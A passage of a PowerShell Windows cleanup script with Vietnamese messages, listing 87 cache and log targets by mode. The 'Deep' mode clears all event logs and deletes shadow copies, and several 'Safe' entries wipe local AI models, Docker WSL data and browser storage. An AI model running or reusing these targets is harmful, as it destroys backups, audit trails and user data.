#Requires -Version 5.1
param(
    [ValidateSet('Menu','Safe','Recommended','Deep','Scan')][string]$Mode = 'Menu',
    [switch]$ScanOnly,
    [switch]$AllUsers,
    [switch]$Yes,
    [switch]$LargeFiles,
    [switch]$AutoScan,
    [switch]$AutoClean,
    [switch]$InstallAutoScan,
    [switch]$InstallAutoClean,
    [switch]$UninstallSchedules,
    [switch]$RunAsAdmin,
    [switch]$HealthCheck,
    [switch]$ImportOnly,
    [switch]$ExportCsv,
    [int]$LargeFileMB = 1024,
    [switch]$SelfTest
)

try { chcp 65001 | Out-Null } catch {}
[Console]::OutputEncoding = [System.Text.UTF8Encoding]::new($true)
[Console]::InputEncoding = [System.Text.UTF8Encoding]::new($true)
$OutputEncoding = [System.Text.UTF8Encoding]::new($true)

$Script:Version = '3.10.0'
$Script:LogDir = Join-Path $PSScriptRoot 'logs'
$Script:RulesFile = Join-Path $PSScriptRoot 'cleanup-rules.json'
$Script:LogFile = Join-Path $Script:LogDir ('cleanup_' + (Get-Date -Format 'yyyy-MM-dd_HH-mm-ss') + '.log')
$Script:LastScan = @()

function Confirm-YN {
    param([string]$Prompt = 'Xac nhan?')
    Write-Host "    $Prompt [C/K] (Y/N): " -NoNewline -ForegroundColor Yellow
    while ($true) {
        $answer = (Read-Host).Trim()
        switch -Regex ($answer) {
            '^(?i)(y|c)$' { return $true }
            '^(?i)(n|k)$' { return $false }
            default { Write-Host '    Vui long nhap C (Co) hoac K (Khong): ' -NoNewline -ForegroundColor Yellow }
        }
    }
}

function Ensure-LogDir { if (-not (Test-Path $Script:LogDir)) { New-Item -Path $Script:LogDir -ItemType Directory -Force | Out-Null } }
function Write-Log { param([string]$Message) Ensure-LogDir; Add-Content -Path $Script:LogFile -Value "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] $Message" -Encoding UTF8 }
function Format-FileSize { param([long]$Size) if ($Size -ge 1GB) { '{0:N2} GB' -f ($Size/1GB) } elseif ($Size -ge 1MB) { '{0:N2} MB' -f ($Size/1MB) } elseif ($Size -ge 1KB) { '{0:N2} KB' -f ($Size/1KB) } else { "$Size Bytes" } }
function Test-AdminRights { $id=[Security.Principal.WindowsIdentity]::GetCurrent(); $p=New-Object Security.Principal.WindowsPrincipal($id); $p.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) }
function Resolve-FullPathSafe { param([string]$Path) try { [System.IO.Path]::GetFullPath($Path).TrimEnd('\') } catch { $null } }
function Expand-CleanPath { param([string]$Path) if (-not $Path) { return $null }; [Environment]::ExpandEnvironmentVariables($Path) }

function Get-UserRoots {
    $roots = @($env:USERPROFILE)
    if ($AllUsers -and (Test-AdminRights)) {
        $roots = @(Get-ChildItem 'C:\Users' -Directory -ErrorAction SilentlyContinue | Where-Object { $_.Name -notin @('Default','Default User','Public','All Users','desktop.ini') } | ForEach-Object { $_.FullName })
    }
    $roots | Where-Object { $_ -and (Test-Path $_) } | Select-Object -Unique
}

function UserPath { param([string]$Relative) @(Get-UserRoots | ForEach-Object { Join-Path $_ $Relative }) }
function LocalPath { param([string]$Relative) @(Get-UserRoots | ForEach-Object { Join-Path $_ (Join-Path 'AppData\Local' $Relative) }) }
function RoamPath { param([string]$Relative) @(Get-UserRoots | ForEach-Object { Join-Path $_ (Join-Path 'AppData\Roaming' $Relative) }) }

$Script:CleanupTargets = @(
    @{ Id=1;  Mode='Safe'; Name='Tep tam nguoi dung'; Type='MultiPath'; Paths=@(LocalPath 'Temp'); MinAgeHours=2; RequireAdmin=$false; Description='Thu muc tep tam thoi cua nguoi dung (User Temp)' },
    @{ Id=2;  Mode='Recommended'; Name='Tep tam he thong'; Type='FolderContents'; Path='C:\Windows\Temp'; MinAgeHours=24; RequireAdmin=$true; Description='Thu muc tep tam thoi cua Windows (System Temp)' },
    @{ Id=3;  Mode='Recommended'; Name='Thung rac'; Type='RecycleBin'; Path=''; MinAgeHours=0; RequireAdmin=$false; Description='Don sach Thung rac cua tat ca cac o dia' },
    @{ Id=4;  Mode='Safe'; Name='Bo nho dem Chrome'; Type='ChromiumCache'; Paths=@(LocalPath 'Google\Chrome\User Data'); RequireAdmin=$false; Description='Bo nho dem trinh duyet Google Chrome (tat ca ho so)' },
    @{ Id=5;  Mode='Safe'; Name='Bo nho dem Edge'; Type='ChromiumCache'; Paths=@(LocalPath 'Microsoft\Edge\User Data'); RequireAdmin=$false; Description='Bo nho dem trinh duyet Microsoft Edge (tat ca ho so)' },
    @{ Id=6;  Mode='Safe'; Name='Bo nho dem Brave'; Type='ChromiumCache'; Paths=@(LocalPath 'BraveSoftware\Brave-Browser\User Data'); RequireAdmin=$false; Description='Bo nho dem trinh duyet Brave (tat ca ho so)' },
    @{ Id=7;  Mode='Safe'; Name='Bo nho dem Firefox'; Type='FirefoxCache'; Paths=@(LocalPath 'Mozilla\Firefox\Profiles'); RequireAdmin=$false; Description='Bo nho dem trinh duyet Mozilla Firefox' },
    @{ Id=8;  Mode='Safe'; Name='Bo nho dem Opera'; Type='OperaCache'; Paths=@(RoamPath 'Opera Software'); RequireAdmin=$false; Description='Bo nho dem trinh duyet Opera va Opera GX' },
    @{ Id=9;  Mode='Safe'; Name='Bo nho dem Thumbnails'; Type='MultiPath'; Paths=@(LocalPath 'Microsoft\Windows\Explorer'); MinAgeHours=24; RequireAdmin=$false; Description='Bo nho dem hinh thu nho cua Windows Explorer' },
    @{ Id=10; Mode='Safe'; Name='Bo nho dem DirectX Shader'; Type='MultiPath'; Paths=@(LocalPath 'D3DSCache'); MinAgeHours=24; RequireAdmin=$false; Description='Bo nho dem do bong DirectX Shader' },
    @{ Id=11; Mode='Safe'; Name='Bo nho dem Internet'; Type='MultiPath'; Paths=@(LocalPath 'Microsoft\Windows\INetCache'); MinAgeHours=24; RequireAdmin=$false; Description='Bo nho tam Internet Explorer / Windows Web Cache' },
    @{ Id=12; Mode='Recommended'; Name='Tep da mo gan day'; Type='MultiPath'; Paths=@(RoamPath 'Microsoft\Windows\Recent'); MinAgeHours=0; RequireAdmin=$false; Description='Loi tat cac tep tin da mo gan day (Recent files)' },
    @{ Id=13; Mode='Recommended'; Name='Bao cao loi Windows'; Type='MultiPath'; Paths=@(LocalPath 'Microsoft\Windows\WER'); MinAgeHours=24; RequireAdmin=$false; Description='Bao cao loi va nhat ky su co he thong (WER)' },
    @{ Id=14; Mode='Recommended'; Name='Toi uu phan phoi tai ve'; Type='MultiPath'; Paths=@((LocalPath 'Microsoft\Windows\DeliveryOptimization') + 'C:\Windows\ServiceProfiles\NetworkService\AppData\Local\Microsoft\Windows\DeliveryOptimization'); MinAgeHours=24; RequireAdmin=$false; Description='Tep luu tam cua tinh nang Delivery Optimization' },
    @{ Id=15; Mode='Deep'; Name='Thu muc Prefetch'; Type='FolderContents'; Path='C:\Windows\Prefetch'; MinAgeHours=24; RequireAdmin=$true; Description='Thu muc tai truoc he thong (Windows Prefetch)' },
    @{ Id=16; Mode='Deep'; Name='Nhat ky Windows tam'; Type='WindowsLogs'; Path='C:\Windows\Logs'; MinAgeHours=168; RequireAdmin=$true; Description='Cac tep nhat ky he thong cu (.log/.tmp/.etl)' },
    @{ Id=17; Mode='Deep'; Name='Don dep thanh phan DISM'; Type='DISM'; Path=''; RequireAdmin=$true; Description='Don dep kho luu tru Windows (DISM /ResetBase - Khong the go bo Update cu)' },
    @{ Id=18; Mode='Recommended'; Name='Bo nho dem Windows Update'; Type='FolderContents'; Path='C:\Windows\SoftwareDistribution\Download'; MinAgeHours=24; RequireAdmin=$true; Description='Bo nho dem cap nhat Windows Update cu' },
    @{ Id=19; Mode='Safe'; Name='Tep CrashDumps'; Type='MultiPath'; Paths=@(LocalPath 'CrashDumps'); MinAgeHours=24; RequireAdmin=$false; Description='Tep ket xuat su co ung dung (User Crash Dumps)' },
    @{ Id=20; Mode='Safe'; Name='Bo nho dem NVIDIA'; Type='MultiPath'; Paths=@((LocalPath 'NVIDIA\DXCache') + (LocalPath 'NVIDIA\GLCache') + (LocalPath 'NVIDIA Corporation\NV_Cache')); MinAgeHours=24; RequireAdmin=$false; Description='Bo nho dem card do hoa NVIDIA GPU' },
    @{ Id=21; Mode='Safe'; Name='Bo nho dem AMD'; Type='MultiPath'; Paths=@((LocalPath 'AMD\DxCache') + (LocalPath 'AMD\GLCache')); MinAgeHours=24; RequireAdmin=$false; Description='Bo nho dem card do hoa AMD GPU' },
    @{ Id=22; Mode='Safe'; Name='Bo nho dem Discord'; Type='MultiPath'; Paths=@((RoamPath 'discord\Cache') + (RoamPath 'discord\Code Cache') + (RoamPath 'discord\GPUCache')); MinAgeHours=24; RequireAdmin=$false; Description='Bo nho dem cua ung dung Discord' },
    @{ Id=23; Mode='Safe'; Name='Bo nho dem Teams cu'; Type='MultiPath'; Paths=@((RoamPath 'Microsoft\Teams\Cache') + (RoamPath 'Microsoft\Teams\Code Cache') + (RoamPath 'Microsoft\Teams\GPUCache')); MinAgeHours=24; RequireAdmin=$false; Description='Bo nho dem Microsoft Teams cu' },
    @{ Id=24; Mode='Safe'; Name='Bo nho dem VS Code'; Type='MultiPath'; Paths=@((RoamPath 'Code\Cache') + (RoamPath 'Code\CachedData') + (RoamPath 'Code\GPUCache')); MinAgeHours=24; RequireAdmin=$false; Description='Bo nho dem ung dung VS Code' },
    @{ Id=25; Mode='Safe'; Name='Bo nho dem Telegram'; Type='MultiPath'; Paths=@((RoamPath 'Telegram Desktop\tdata\user_data\cache') + (RoamPath 'Telegram Desktop\tdata\user_data\media_cache')); MinAgeHours=24; RequireAdmin=$false; Description='Bo nho dem hinh anh va tep tam Telegram' },
    @{ Id=26; Mode='Safe'; Name='Bo nho dem lap trinh'; Type='MultiPath'; Paths=@((LocalPath 'npm-cache') + (LocalPath 'pip\Cache') + (UserPath '.nuget\packages') + (LocalPath 'Yarn\Cache') + (LocalPath 'pnpm-store') + (RoamPath 'Composer\Cache') + (UserPath '.gradle\caches') + (UserPath '.m2\repository') + (UserPath '.cargo\registry\cache') + (LocalPath 'go-build')); MinAgeHours=168; RequireAdmin=$false; Description='Bo nho dem cac cong cu lap trinh (npm, pip, nuget, gradle, cargo...)' },
    @{ Id=27; Mode='Safe'; Name='Bo nho dem Slack'; Type='MultiPath'; Paths=@((RoamPath 'Slack\Cache') + (RoamPath 'Slack\Code Cache') + (RoamPath 'Slack\GPUCache')); MinAgeHours=24; RequireAdmin=$false; Description='Bo nho dem ung dung Slack' },
    @{ Id=28; Mode='Safe'; Name='Bo nho dem Zoom'; Type='MultiPath'; Paths=@((RoamPath 'Zoom\data\Cache') + (RoamPath 'Zoom\data\Code Cache') + (RoamPath 'Zoom\data\GPUCache')); MinAgeHours=24; RequireAdmin=$false; Description='Bo nho dem ung dung hop truc tuyen Zoom' },
    @{ Id=29; Mode='Safe'; Name='Bo nho dem Spotify'; Type='MultiPath'; Paths=@((LocalPath 'Spotify\Storage') + (RoamPath 'Spotify\Browser\Cache')); MinAgeHours=24; RequireAdmin=$false; Description='Bo nho dem nghe nhac Spotify' },
    @{ Id=30; Mode='Safe'; Name='Bo nho dem Steam'; Type='MultiPath'; Paths=@((LocalPath 'Steam\htmlcache') + (UserPath 'AppData\Local\Steam\shadercache')); MinAgeHours=168; RequireAdmin=$false; Description='Bo nho dem shader va web cua Steam' },
    @{ Id=31; Mode='Safe'; Name='Bo nho dem Epic Launcher'; Type='MultiPath'; Paths=@((LocalPath 'EpicGamesLauncher\Saved\webcache') + (LocalPath 'EpicGamesLauncher\Saved\webcache_4430') + (LocalPath 'EpicGamesLauncher\Saved\Logs')); MinAgeHours=24; RequireAdmin=$false; Description='Bo nho dem va nhat ky Epic Games Launcher' },
    @{ Id=32; Mode='Safe'; Name='Bo nho dem Battle.net'; Type='MultiPath'; Paths=@((LocalPath 'Battle.net\Cache') + (LocalPath 'Blizzard Entertainment\Battle.net\Cache')); MinAgeHours=24; RequireAdmin=$false; Description='Bo nho dem trinh khoi chay game Battle.net' },
    @{ Id=33; Mode='Safe'; Name='Bo nho dem Adobe'; Type='MultiPath'; Paths=@((RoamPath 'Adobe\Common\Media Cache') + (RoamPath 'Adobe\Common\Media Cache Files') + (LocalPath 'Adobe\Acrobat\DC\Cache')); MinAgeHours=168; RequireAdmin=$false; Description='Bo nho dem phuong tien Adobe Premiere/Acrobat' },
    @{ Id=34; Mode='Safe'; Name='Bo nho dem VLC'; Type='MultiPath'; Paths=@(RoamPath 'vlc\art'); MinAgeHours=168; RequireAdmin=$false; Description='Bo nho dem bia album va anh bia VLC Player' },
    @{ Id=35; Mode='Safe'; Name='Bo nho dem JetBrains'; Type='MultiPath'; Paths=@((LocalPath 'JetBrains') | ForEach-Object { if (Test-Path $_) { Get-ChildItem $_ -Directory -ErrorAction SilentlyContinue | ForEach-Object { Join-Path $_.FullName 'caches' } } }); MinAgeHours=168; RequireAdmin=$false; Description='Bo nho dem cua cac IDE JetBrains (IntelliJ, PyCharm, WebStorm...)' },
    @{ Id=36; Mode='Safe'; Name='Bo nho dem Android Studio'; Type='MultiPath'; Paths=@((LocalPath 'Google\AndroidStudio') | ForEach-Object { if (Test-Path $_) { Get-ChildItem $_ -Directory -ErrorAction SilentlyContinue | ForEach-Object { Join-Path $_.FullName 'caches' } } }); MinAgeHours=168; RequireAdmin=$false; Description='Bo nho dem Android Studio IDE' },
    @{ Id=37; Mode='Recommended'; Name='Tap loi Windows'; Type='MultiPath'; Paths=@('C:\Windows\Minidump','C:\Windows\LiveKernelReports','C:\Windows\MEMORY.DMP'); MinAgeHours=168; RequireAdmin=$true; Description='Tap tin ket xuat loi he thong (Minidump va MEMORY.DMP)' },
    @{ Id=38; Mode='Safe'; Name='Bo nho dem Font Cache'; Type='MultiPath'; Paths=@('C:\Windows\ServiceProfiles\LocalService\AppData\Local\FontCache','C:\Windows\System32\FNTCACHE.DAT'); MinAgeHours=24; RequireAdmin=$true; Description='Bo nho dem phong chu he thong Windows' },
    @{ Id=39; Mode='Safe'; Name='Bo nho dem Edge WebView2'; Type='MultiPath'; Paths=@(LocalPath 'Microsoft\EdgeWebView\User Data'); MinAgeHours=24; RequireAdmin=$false; Description='Bo nho dem cua trinh dung WebView2' },
    @{ Id=40; Mode='Safe'; Name='Lich su quet Windows Defender'; Type='MultiPath'; Paths=@('C:\ProgramData\Microsoft\Windows Defender\Scans\History\CacheManager','C:\ProgramData\Microsoft\Windows Defender\Scans\History\Store'); MinAgeHours=168; RequireAdmin=$true; Description='Lich su va bo nho dem quet virus cua Windows Defender' },
    @{ Id=41; Mode='Safe'; Name='Bao cao su co Crashpad'; Type='MultiPath'; Paths=@((LocalPath 'Google\Chrome\User Data\Crashpad\reports') + (LocalPath 'Microsoft\Edge\User Data\Crashpad\reports') + (LocalPath 'BraveSoftware\Brave-Browser\User Data\Crashpad\reports')); MinAgeHours=24; RequireAdmin=$false; Description='Tep ket xuat bao cao loi Crashpad cua trinh duyet' },
    @{ Id=42; Mode='Safe'; Name='Bo luu tru trinh duyet Chromium'; Type='MultiPath'; Paths=@(((LocalPath 'Google\Chrome\User Data')+(LocalPath 'Microsoft\Edge\User Data')+(LocalPath 'BraveSoftware\Brave-Browser\User Data')) | ForEach-Object { if (Test-Path $_) { Get-ChildItem $_ -Directory -ErrorAction SilentlyContinue | Where-Object { $_.Name -match '^(Default|Profile \d+|Guest Profile|System Profile)$' } | ForEach-Object { foreach ($sub in @('GPUCache','ShaderCache','GrShaderCache','Local Storage','IndexedDB')) { Join-Path $_.FullName $sub } } } }); MinAgeHours=24; RequireAdmin=$false; Description='Don dep ShaderCache, Local Storage, IndexedDB cua Chrome/Edge/Brave (ChromiumStorage)' },
    @{ Id=43; Mode='Safe'; Name='Bo luu tru Coc Coc'; Type='MultiPath'; Paths=@((LocalPath 'CocCoc\Browser\User Data') | ForEach-Object { if (Test-Path $_) { Get-ChildItem $_ -Directory -ErrorAction SilentlyContinue | Where-Object { $_.Name -match '^(Default|Profile \d+|Guest Profile|System Profile)$' } | ForEach-Object { foreach ($sub in @('GPUCache','ShaderCache','GrShaderCache','Local Storage','IndexedDB')) { Join-Path $_.FullName $sub } } } }); MinAgeHours=24; RequireAdmin=$false; Description='Don dep ShaderCache, Local Storage, IndexedDB cua Coc Coc' },
    @{ Id=45; Mode='Safe'; Name='Bo nho dem Office/OneDrive'; Type='MultiPath'; Paths=@((LocalPath 'Microsoft\Office\16.0\OfficeFileCache')+(LocalPath 'Microsoft\OneDrive\logs')+(LocalPath 'Microsoft\OneDrive\setup\logs')); MinAgeHours=168; RequireAdmin=$false; Description='Bo nho dem Office va nhat ky OneDrive cu' },
    @{ Id=46; Mode='Safe'; Name='Bo nho dem Terminal/Shell'; Type='MultiPath'; Paths=@((LocalPath 'Packages\Microsoft.WindowsTerminal_8wekyb3d8bbwe\LocalCache')+(LocalPath 'Microsoft\Windows\Explorer\IconCacheToDelete')+(LocalPath 'Microsoft\Windows\Caches')); MinAgeHours=24; RequireAdmin=$false; Description='Bo nho dem icon, terminal va cache he thong an toan' },
    @{ Id=47; Mode='Safe'; Name='Bo nho dem dev khac'; Type='MultiPath'; Paths=@((LocalPath 'NuGet\Cache')+(LocalPath 'Microsoft\VisualStudio\ComponentModelCache')+(LocalPath 'Temp\chocolatey')+(LocalPath 'vcpkg\archives')+(UserPath '.cache\pip')+(UserPath '.cache\huggingface')+(UserPath '.cache\torch')+(UserPath '.deno')+(UserPath '.npm')+(UserPath '.bun\install\cache')+(LocalPath 'Docker\log')+(LocalPath 'Docker\wsl\data')); MinAgeHours=168; RequireAdmin=$false; Description='Bo nho tam lap trinh bo sung (NuGet, Chocolatey, Docker, Huggingface...)' },
    @{ Id=48; Mode='Deep'; Name='Tep tam Windows Installer'; Type='InstallerPatchOrphans'; Path='C:\Windows\Installer'; MinAgeHours=720; RequireAdmin=$true; Description='Chi xoa tep mo coi .tmp/.log/.old trong Installer, giu lai .msi/.msp' },
    @{ Id=49; Mode='Safe'; Name='Bo nho dem Coc Coc'; Type='ChromiumCache'; Paths=@(LocalPath 'CocCoc\Browser\User Data'); RequireAdmin=$false; Description='Bo nho dem trinh duyet Coc Coc (tat ca ho so)' },
    @{ Id=50; Mode='Deep'; Name='Thu muc nang cap Windows cu'; Type='MultiPath'; Paths=@('C:\$WINDOWS.~BT','C:\$WINDOWS.~WS','C:\Windows.old'); MinAgeHours=168; RequireAdmin=$true; Description='Thu muc sao luu nang cap Windows cu (C:\$WINDOWS.~BT, C:\$WINDOWS.~WS, C:\Windows.old)' },
    @{ Id=51; Mode='Safe'; Name='Bo nho dem Game (Garena/Riot)'; Type='MultiPath'; Paths=@((LocalPath 'Garena\Cache')+(LocalPath 'GarenaMessenger\Cache')+(LocalPath 'Riot Games\Riot Client\Data\Cache')+(LocalPath 'Riot Games\Riot Client\Data\Code Cache')+(LocalPath 'Riot Games\Riot Client\Data\GPUCache')); MinAgeHours=24; RequireAdmin=$false; Description='Bo nho dem cua cac cong game Garena va Riot Client' },
    @{ Id=52; Mode='Safe'; Name='Bo nho dem Zalo'; Type='ChromiumCache'; Paths=@(LocalPath 'ZaloPC'); RequireAdmin=$false; Description='Bo nho dem cua ung dung Zalo PC' },
    @{ Id=53; Mode='Safe'; Name='Bo nho dem Vivaldi'; Type='ChromiumCache'; Paths=@(LocalPath 'Vivaldi\User Data'); RequireAdmin=$false; Description='Bo nho dem trinh duyet Vivaldi (tat ca ho so)' },
    @{ Id=54; Mode='Safe'; Name='Bo nho dem Clipboard'; Type='MultiPath'; Paths=@(LocalPath 'Microsoft\Windows\Clipboard'); RequireAdmin=$false; Description='Bo nho dem khay nho tam Clipboard cua Windows' },
    @{ Id=55; Mode='Safe'; Name='Lich su hoat dong Windows (Timeline)'; Type='MultiPath'; Paths=@(LocalPath 'ConnectedDevicesPlatform'); RequireAdmin=$false; Description='Nhat ky lich su hoat dong Windows Timeline' },
    @{ Id=56; Mode='Safe'; Name='Bo nho dem thong bao Windows'; Type='MultiPath'; Paths=@(LocalPath 'Microsoft\Windows\Notifications'); RequireAdmin=$false; Description='Lich su thong bao he thong cua Windows' },
    @{ Id=57; Mode='Safe'; Name='Bo nho dem Roblox'; Type='MultiPath'; Paths=@(LocalPath 'Roblox\logs'); MinAgeHours=24; RequireAdmin=$false; Description='Cac tep nhat ky va tep tam thoi cua game Roblox' },
    @{ Id=58; Mode='Safe'; Name='Bo nho dem GOG Galaxy'; Type='MultiPath'; Paths=@(LocalPath 'GOG.com\Galaxy\webcache'); RequireAdmin=$false; Description='Bo nho dem web cua trinh quan ly game GOG Galaxy' },
    @{ Id=59; Mode='Safe'; Name='Bo nho dem Ubisoft Connect'; Type='MultiPath'; Paths=@(LocalPath 'Ubisoft Game Launcher\cache'); RequireAdmin=$false; Description='Bo nho dem cua Ubisoft Connect Launcher' },
    @{ Id=60; Mode='Safe'; Name='Bo nho dem ung dung UWP'; Type='MultiPath'; Paths=@((LocalPath 'Packages') | ForEach-Object { if (Test-Path $_) { Get-ChildItem $_ -Directory -ErrorAction SilentlyContinue | ForEach-Object { Join-Path $_.FullName 'LocalCache' } } }); MinAgeHours=24; RequireAdmin=$false; Description='Bo nho dem LocalCache cua cac ung dung Windows Store (UWP)' },
    @{ Id=61; Mode='Safe'; Name='Bo nho dem Microsoft Teams moi'; Type='MultiPath'; Paths=@(LocalPath 'Packages\MSTeams_8wekyb3d8bbwe\LocalCache\Microsoft\MSTeams'); MinAgeHours=24; RequireAdmin=$false; Description='Bo nho dem ung dung Microsoft Teams moi (UWP)' },
    @{ Id=62; Mode='Deep'; Name='Nhat ky cai dat Windows (Panther)'; Type='FolderContents'; Path='C:\Windows\Panther'; MinAgeHours=168; RequireAdmin=$true; Description='Nhat ky nang cap va cai dat he dieu hanh (Windows Panther)' },
    @{ Id=63; Mode='Safe'; Name='Bo nho dem LINE Messenger'; Type='MultiPath'; Paths=@(LocalPath 'LINE\Cache'); RequireAdmin=$false; Description='Bo nho dem cua ung dung nhan tin LINE Messenger' },
    @{ Id=64; Mode='Recommended'; Name='Bao cao loi Windows (System)'; Type='MultiPath'; Paths=@('C:\ProgramData\Microsoft\Windows\WER'); MinAgeHours=24; RequireAdmin=$true; Description='Bao cao loi va nhat ky su co he thong toan cuc (System WER)' },
    @{ Id=65; Mode='Deep'; Name='Nhat ky System32'; Type='FolderContents'; Path='C:\Windows\System32\LogFiles'; MinAgeHours=168; RequireAdmin=$true; Description='Cac tep nhat ky he thong trong System32' },
    @{ Id=66; Mode='Deep'; Name='Nhat ky su kien (Event Logs)'; Type='EventLogs'; Path=''; RequireAdmin=$true; Description='Xoa toan bo nhat ky su kien he thong Windows (wevtutil)' },
    @{ Id=67; Mode='Deep'; Name='Ban sao luu an (Shadow Copies)'; Type='ShadowCopies'; Path=''; RequireAdmin=$true; Description='Xoa cac ban sao luu an va diem khoi phuc he thong cu (vssadmin)' },
    @{ Id=68; Mode='Safe'; Name='Bo nho dem Mang (DNS & ARP)'; Type='NetworkCache'; Path=''; RequireAdmin=$true; Description='Xoa DNS Cache va ARP Cache cua card mang' },
    @{ Id=69; Mode='Recommended'; Name='Toi uu phan phoi (Delivery API)'; Type='DeliveryOpt'; Path=''; RequireAdmin=$true; Description='Xoa Delivery Optimization Cache thong qua API he thong' },
    @{ Id=70; Mode='Recommended'; Name='Bo nho dem BranchCache'; Type='BranchCache'; Path=''; RequireAdmin=$true; Description='Xoa bo nho dem mang noi bo BranchCache' },
    @{ Id=71; Mode='Safe'; Name='Bo nho dem chung chi (Cryptnet)'; Type='MultiPath'; Paths=@('C:\Windows\System32\config\systemprofile\AppData\LocalLow\Microsoft\CryptnetUrlCache'); MinAgeHours=24; RequireAdmin=$true; Description='Bo nho dem chung chi ma hoa he thong' },
    @{ Id=72; Mode='Safe'; Name='Lich su lenh PowerShell'; Type='PowerShellHistory'; Path=''; RequireAdmin=$false; Description='Xoa lich su cac lenh da go trong PowerShell' },
    @{ Id=73; Mode='Safe'; Name='Bo nho dem ung dung khac'; Type='MultiPath'; Paths=@((RoamPath 'Postman\Cache')+(RoamPath 'Postman\Code Cache')+(RoamPath 'Postman\GPUCache')+(RoamPath 'Notion\Cache')+(RoamPath 'Notion\Code Cache')+(RoamPath 'GitHub Desktop\Cache')+(LocalPath 'WhatsApp\Cache')+(LocalPath 'Packages\5319275A.WhatsAppDesktop_cv1g1gvanyjgm\LocalCache')); MinAgeHours=24; RequireAdmin=$false; Description='Bo nho dem cua Postman, Notion, GitHub Desktop, WhatsApp' },
    @{ Id=74; Mode='Deep'; Name='Windows Defender Quarantine'; Type='MultiPath'; Paths=@('C:\ProgramData\Microsoft\Windows Defender\Quarantine'); RequireAdmin=$true; Description='Xoa cac tep da bi cach ly boi Windows Defender' },
    @{ Id=75; Mode='Deep'; Name='Driver cu (DriverStore)'; Type='DriverStore'; Path=''; RequireAdmin=$true; Description='Xoa cac driver OEM cu khong con su dung bang pnputil' },
    @{ Id=76; Mode='Deep'; Name='Tat ngu dong (Hibernation)'; Type='Hibernation'; Path=''; RequireAdmin=$true; Description='Tat che do ngu dong de xoa file hiberfil.sys' },
    @{ Id=77; Mode='Deep'; Name='Manh vo kiem tra o dia'; Type='MultiPath'; Paths=@('C:\Found.000','C:\Found.001','C:\Found.002'); RequireAdmin=$true; Description='Xoa cac file sua loi tu Check Disk (Found.000)' },
    @{ Id=78; Mode='Deep'; Name='Nhat ky may chu Web (IIS Logs)'; Type='FolderContents'; Path='C:\inetpub\logs\LogFiles'; MinAgeHours=24; RequireAdmin=$true; Description='Xoa nhat ky cua Windows IIS Web Server' },
    @{ Id=79; Mode='Recommended'; Name='Quet dong moi App (Universal Cache)'; Type='DynamicAppCache'; Path=''; MinAgeHours=24; RequireAdmin=$false; Description='Tu dong truy tim moi thu muc ten Cache/logs cua cac ung dung la trong AppData' },
    @{ Id=80; Mode='Safe'; Name='Bo nho dem AI / LLMs'; Type='MultiPath'; Paths=@((UserPath '.ollama\models')+(UserPath '.cache\lm-studio')+(LocalPath 'nomic.ai\GPT4All')); MinAgeHours=168; RequireAdmin=$false; Description='Cac mo hinh AI cuc bo (Ollama, LM Studio, GPT4All)' },
    @{ Id=81; Mode='Safe'; Name='Bo nho dem CapCut'; Type='MultiPath'; Paths=@(LocalPath 'CapCut\User Data\Cache'); MinAgeHours=24; RequireAdmin=$false; Description='Bo nho dem va proxy cua CapCut PC' },
    @{ Id=82; Mode='Safe'; Name='Bo nho dem Arc Browser'; Type='MultiPath'; Paths=@((LocalPath 'Packages\BCC22284.Arc_cw5n1h2txyewy\LocalCache\Local\Arc')+(LocalPath 'Packages\BCC22284.Arc_cw5n1h2txyewy\LocalCache\Roaming\Arc')); MinAgeHours=24; RequireAdmin=$false; Description='Bo nho dem trinh duyet Arc' },
    @{ Id=83; Mode='Safe'; Name='Bo nho dem Cursor IDE'; Type='MultiPath'; Paths=@((RoamPath 'Cursor\Cache')+(RoamPath 'Cursor\Code Cache')+(RoamPath 'Cursor\GPUCache')+(RoamPath 'Cursor\CachedData')); MinAgeHours=24; RequireAdmin=$false; Description='Bo nho dem cua trinh soan thao Cursor' },
    @{ Id=84; Mode='Safe'; Name='Bo nho dem EA App'; Type='MultiPath'; Paths=@(LocalPath 'Electronic Arts\EA Desktop\Cache'); MinAgeHours=24; RequireAdmin=$false; Description='Bo nho dem ung dung EA Desktop' },
    @{ Id=85; Mode='Safe'; Name='Lap trinh bo sung (Rust/Conda)'; Type='MultiPath'; Paths=@((UserPath '.rustup\downloads')+(UserPath 'miniconda3\pkgs')+(UserPath 'anaconda3\pkgs')); MinAgeHours=168; RequireAdmin=$false; Description='Bo nho dem Rustup, Conda packages' },
    @{ Id=86; Mode='Safe'; Name='Bo nho dem Windows Widgets'; Type='MultiPath'; Paths=@(LocalPath 'Packages\MicrosoftWindows.Client.WebExperience_cw5n1h2txyewy\LocalCache'); MinAgeHours=24; RequireAdmin=$false; Description='Bo nho dem thanh Widgets tren Windows 11' },
    @{ Id=87; Mode='Safe'; Name='Bo nho dem Winget'; Type='MultiPath'; Paths=@((LocalPath 'Packages\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe\LocalState\DiagOutputDir')+(LocalPath 'Temp\WinGet')); MinAgeHours=24; RequireAdmin=$false; Description='Trinh quan ly goi Winget cua Windows 11' }
)

function Split-ConcatenatedWindowsPaths {
    param([string]$Text)
    if ([string]::IsNullOrWhiteSpace($Text)) { return @() }
    if ($Text -match '[A-Za-z]:\\.+[A-Za-z]:\\') {
        @($Text -split '(?=[A-Za-z]:\\)') | Where-Object { -not [string]::IsNullOrWhiteSpace($_) } | ForEach-Object { $_.Trim().TrimEnd('\') }
    } else {
        @($Text.Trim().TrimEnd('\'))
    }
}

function Expand-PathListFlat {
    param([array]$Paths)
    $flat = @()
    foreach ($p in $Paths) {
        if ($p -is [array]) {
            foreach ($sub in $p) { $flat += Split-ConcatenatedWindowsPaths $sub }
        } else {
            $flat += Split-ConcatenatedWindowsPaths $p
        }
    }
    $flat | Select-Object -Unique
}

function Test-PathAllowedForCleanup {
    param([string]$Path)
    if ([string]::IsNullOrWhiteSpace($Path)) { return $false }
    $full = Resolve-FullPathSafe $Path
    if (-not $full) { return $false }
    
    # 1. Bao ve cac thu muc he thong quan trong
    $protected = @(
        $env:SystemDrive,
        $env:WINDIR,
        (Join-Path $env:WINDIR 'System32'),
        (Join-Path $env:WINDIR 'SysWOW64'),
        $env:ProgramFiles,
        ${env:ProgramFiles(x86)}
    ) + (Get-UserRoots | ForEach-Object { 
        @($_, 
          (Join-Path $_ 'Desktop'), 
          (Join-Path $_ 'Documents'), 
          (Join-Path $_ 'Downloads'), 
          (Join-Path $_ 'Pictures'), 
          (Join-Path $_ 'Videos'), 
          (Join-Path $_ 'Music')) 
    })
    
